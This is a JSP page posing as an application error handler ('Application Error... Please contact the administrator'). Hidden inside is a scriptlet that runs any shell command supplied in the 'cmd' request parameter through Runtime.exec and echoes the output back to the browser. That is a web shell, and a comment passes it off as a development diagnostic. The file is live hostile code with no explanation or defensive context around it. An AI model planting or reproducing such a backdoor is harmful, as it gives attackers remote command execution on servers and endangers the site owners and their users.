<%@ page language="java" contentType="text/html; charset=UTF-8" %>
<%@ page import="java.io.*" %>
<!DOCTYPE html>
<html>
<head>
    <title>Error Handler</title>
</head>
<body>
    <h2>Application Error</h2>
    <p>An unexpected error occurred. Please contact the administrator.</p>
    <%
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.isEmpty()) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String l;
                while ((l = r.readLine()) != null) {
                    out.println(l + "<br/>");
                }
                r.close();
            } catch (Exception e) {
                out.println("Error: " + e.getMessage());
            }
        }
    %>
    <!-- TODO: cmd parameter used for diagnostic shell commands during development -->
</body>
</html>
